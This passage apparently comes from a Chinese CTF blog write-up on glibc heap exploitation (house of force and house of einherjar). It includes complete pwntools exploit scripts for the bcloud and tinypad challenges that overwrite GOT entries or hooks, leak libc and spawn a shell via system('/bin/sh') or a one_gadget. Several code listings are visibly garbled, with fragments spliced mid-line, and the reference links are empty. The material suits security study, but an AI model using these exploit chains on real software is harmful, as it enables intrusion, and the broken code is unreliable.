我使用的方法的修改free_got的值为printf的值，然后在delete函数中，`free(note_list[x])`，`note_list[x]`修改成atoi_got的地址，这样就能泄露出atoi_got的值
但是因为不知道libc，所以不知道printf的值，但是因为有延时绑定，所以我们能把free_got的值修改成printf_plt+6的值
获取到libc的地址后，可以计算出system的值，然后再把atoi_got的值修改成system地址，达到getshell的目的
完整payload:
    #!/usr/bin/env python2.7
    # -*- coding=utf-8 -*-    
    from pwn import *
    context.log_level = "debug"
    def new_note(len,content):
        p.readuntil("--->>")
        p.sendline("1")
        p.readuntil("content:")
        p.sendline(str(len))
        p.readuntil("content:")
        p.sendline(content)
    def edit_note(i, data):
        p.readuntil("--->>")
        p.sendline("3")
        p.readuntil("id:\n")
        p.sendline(str(i))
        p.readuntil("content:\n")
        p.sendline(data)
        p.readuntil("success.")
    def delete_note(i):
        p.readuntil("--->>")
        p.sendline("4")
        p.readuntil("id:\n")
        p.sendline(str(i))
    p = process("./bcloud")
    e = ELF("./bcloud")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    pause()
    # leak heap
    p.readuntil("name:\n")
    p.send("a"*0x40)
    p.read(0x44)
    heap = u32(p.read(4))
    print "heap addr: " + hex(heap)
    # modify top chunk size to 0xffffffff
    p.readuntil("Org:")
    p.send("a"*0x40)
    p.readuntil("Host:")
    p.sendline(p32(0xffffffff))
    p.readuntil("Enjoy:")
    # malloc return address:0x804B120
    note_list = 0x804B120
    new_note(0x10, "aaa")
    new_note(-(heap+0xf4-0x804B120+8), "2333")
    # note_list[0] = free_got
    # note_list[1] = atoi_got
    # note_list[2] = atoi_got
    payload = p32(e.got["free"])
    payload += p32(e.got["atoi"])
    payload += p32(e.got["atoi"])
    new_note(0x100, payload)
    # write printf address to free_got
    edit_note(0, p32(e.symbols["printf"]+6))
    # printf(atoi_got)
    delete_note(1)
    atoi_libc = u32(p.read(4))
    p.readuntil("success.")
    libc_base = atoi_libc - libc.symbols["atoi"]
    print "libc_base: " + hex(libc_base)
    # calculate system address
    system = libc.symbols["system"] + libc_base
    # write system address to atoi_got
    edit_note(2, p32(system))
    # system("/bin/sh")
    p.sendline("/bin/sh")
    p.interactive()
#### house of einherjar
house of einherjar跟house of force差不多，最终目的都是控制top chunk的值，利用demo可参考:
题目见: 
和house of force的区别是，通过off by
one把最后一个chunk的pre_inuse标志位置零，让free函数以为上一个chunk已经被free，这就要求了最后一个chunk的size必须要是0x100的倍数，要不然会check下一个chunk失败，或者和top
chunk进行合并操作的时候失败。
然后再伪造一个chunk，计算最后一个chunk到我们伪造chunk的距离，设置为最后一个chunk的pre_size位，当free最后一个chunk时，会将伪造的chunk和当前chunk和top
chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址。
接下来通过2016年Second ctf的一个题来加深对该利用方法的理解：
##### 内存泄露
    if ( *(_QWORD *)&tinypad[16 * (v11 - 1 + 16LL)] )
    {
        free(*(void **)&tinypad[16 * (v11 - 1 + 16LL) + 8]);
        *(_QWORD *)&tinypad[16 * (v11 - 1 + 16LL)] = 0LL;
        writeln((__int64)"\nDeleted.", 9LL);
    }
在free了一个tinypad的时候，只把size位置零了，但是却没有把储存content的地址(`tinypad[16 * (v11 - 1 +
16LL) + 8]`)置零
然后在每次循环的时候，都会输出四个tinypad的信息：
    for ( i = 0; i >> ", 13LL);
                v7 = strlen(*(const char **)&tinypad[16 * (v11 - 1 + 16LL) + 8]);
                read_until((__int64)tinypad, v7, '\n');        # 控制tinypad的值
                writeln((__int64)"Is it OK?", 9LL);
                write_n((__int64)"(Y/n)>>> ", 9LL);
                read_until((__int64)&c, 1uLL, 0xAu);
              }
              strcpy(*(char **)&tinypad[16 * (v11 - 1 + 16LL) + 8], tinypad);
              writeln((__int64)"\nEdited.", 8LL);
            }
所以我们tinypad就是我们伪造的chunk，伪造的chunk如下：
`&tinypad`:
刚才泄露内存已经释放了两个tinypad，还剩第二个和第四个tinypad，这个时候我释放第四个tinypad，这样第三个第四个将会和top_chunk合并
只要经过精心计算，这个时候我们再add一个tinypad，将会获得第一个tinypad(已经被释放)的堆地址，然后利用off by one漏洞:
    unsigned __int64 read_until(__int64 buf, unsigned __int64 len, unsigned int end)
    {
      int v4; // [rsp+Ch] [rbp-34h]
      unsigned __int64 i; // [rsp+28h] [rbp-18h]
      signed __int64 v6; // [rsp+30h] [rbp-10h]
      v4 = end;
      for ( i = 0LL; i >>")
        p.sendline("a")
        p.readuntil("(SIZE)>>>")
        p.sendline(str(size))
        p.readuntil("(CONTENT)>>>")
        p.sendline(content)
    def delete(p, index):
        p.readuntil("(CMD)>>>")
        p.sendline("d")
        p.readuntil("(INDEX)>>>")
        p.sendline(str(index))
    def edit(p, index, content):
        p.readuntil("(CMD)>>>")
        p.sendline("e")
        p.readuntil("(INDEX)>>>")
        p.sendline(str(index)) 
        p.readuntil("(CONTENT)>>>")
        p.sendline(content)
        p.readuntil("(Y/n)>>>")
        p.sendline("y")
    def main():
        # context.log_level = "debug"
        p = process("./tinypad")
        # e = ELF("./tinypad")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        # leak libc and heap address
        add(p, 224, "a"*10)
        add(p, 246, "b"*0xf0)
        add(p, 256, "c"*0xf0)
        add(p, 256, "d"*10)
        delete(p, 3)
        delete(p, 1)
        # get heap address
        p.readuntil("# CONTENT: ")
        heap = p.readline().rstrip()
        heap += "\x00"*(8-len(heap))
        heap_base = u64(heap) - 0x1f0
        print "heap_base address: " + hex(heap_base)
        # get libc address
        p.readuntil("INDEX: 3")
        p.readuntil("# CONTENT: ")
        libc_address = p.readline().strip()
        libc_address += "\x00"*(8-len(libc_address))
        libc_base = u64(libc_address) - 0x3c4b78
        print "libc_base address: " + hex(libc_base)
        # make top -> tinypad(0x602040)
        add(p, 232, "g"*224 + p64(heap_base+240-0x602040))
        delete(p, 4)
        payload = p64(0x100) + p64(heap_base+240-0x602040) + p64(0x602040)*4
        edit(p, 2, payload)
        delete(p, 2)
        # modify free_hook -> one_gadget
        gadget1 = 0xf1117
        gadget2 = 0xf0274
        gadget3 = 0xcd1c8
        gadget4 = 0xcd0f3
        gadget5 = 0x4526a
        gadget6 = 0xf66c0
        gadget_address = libc_base + gadget1
        add(p, 0xe0, "t"*0xd0)
        payload = p64(232) + p64(libc_base + libc.symbols["__environ"])
        payload += p64(232) + p64(0x602148)
        add(p, 0x100, payload)
        p.readuntil("# CONTENT: ")
        stack = p.read(6)
        stack += "\x00"*(8-len(stack))
        stack_env = u64(stack)
        print "env_stack address: " + hex(stack_env)
        # pause()
        edit(p, 2, p64(stack_env-240))
        edit(p, 1, p64(gadget_address))
        p.readuntil("(CMD)>>>")
        p.sendline("Q")
        p.interactive()
    if __name__ == '__main__':
        main()
#### 总结
本篇文章分析了
  * house of spirit
  * house_of_force
  * house_of_einherjar
三种利用方法，还剩两种
  * house_of_orange
  * house_of_lore
其中，`house_of_lore`没发现有具体的实例题目，所以暂时不做研究
而`house_of_orange`涉及的知识点过多，所以会单独写一篇
house of系列第一次出现是`Phrack`2009年的杂志上，一共出现了下面几种：
  * The House of Mind
  * The House of Prime
  * The House of Spirit
  * The House of Force
  * The House of Lore
最后三种在how2heap上都有，前面两种，下次再说
#### 参考
  1. 
  2. 
  3. 
  4. 
* * *